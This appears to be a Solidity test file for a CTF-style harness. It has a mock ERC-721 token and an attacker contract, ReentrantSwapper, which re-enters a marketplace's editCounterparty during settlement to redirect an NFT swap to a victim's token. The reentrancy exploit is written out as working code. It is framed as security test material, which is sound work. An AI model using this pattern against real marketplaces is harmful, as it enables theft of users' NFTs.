// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Self-contained test doubles for the NFTTrader gate. No imports from the corpus / fixtures /
// vendor - the CTF is decoupled from the harness core by code.

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IMarketplace {
    function editCounterparty(uint256 swapId, address counterparty, address cpNft, uint256 cpTokenId) external;
}

/// @dev Minimal ERC-721 with operator approval and a real `safeTransferFrom` callback (the
///      reentrancy entry point the vector needs).
contract MockERC721 {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        require(ownerOf[tokenId] == from, "ERC721: wrong owner");
        require(
            msg.sender == from || isApprovedForAll[from][msg.sender],
            "ERC721: caller is not token owner or approved"
        );
        ownerOf[tokenId] = to;
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        transferFrom(from, to, tokenId);
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "") == 0x150b7a02,
                "ERC721: unsafe recipient"
            );
        }
    }
}

/// @dev The attacker. It opens a swap of its own tokens (so it is both opener and the leg-1
///      recipient), and when the marketplace calls it back mid-settlement it re-enters
///      `editCounterparty` to point the swap at a victim.
contract ReentrantSwapper is IERC721Receiver {
    IMarketplace public mp;
    uint256 public swapId;
    address public victim;
    address public victimNft;
    uint256 public victimToken;
    bool public fired;

    function prepare(
        MockERC721 nft,
        address marketplace,
        uint256 openerToken,
        uint256 cpToken,
        address victim_,
        address victimNft_,
        uint256 victimToken_
    ) external returns (uint256 id) {
        nft.setApprovalForAll(marketplace, true);
        // opener = this contract; counterparty = this contract too (so leg 1 calls us back).
        (bool ok, bytes memory ret) = marketplace.call(
            abi.encodeWithSignature(
                "createSwap(address,uint256,address,uint256,address)",
                address(nft),
                openerToken,
                address(nft),
                cpToken,
                address(this)
            )
        );
        require(ok, "prepare: createSwap failed");
        id = abi.decode(ret, (uint256));
        mp = IMarketplace(marketplace);
        swapId = id;
        victim = victim_;
        victimNft = victimNft_;
        victimToken = victimToken_;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (!fired && address(mp) != address(0)) {
            fired = true;
            // Re-enter mid-settlement to redirect the counterparty to the victim.
            mp.editCounterparty(swapId, victim, victimNft, victimToken);
        }
        return 0x150b7a02;
    }
}
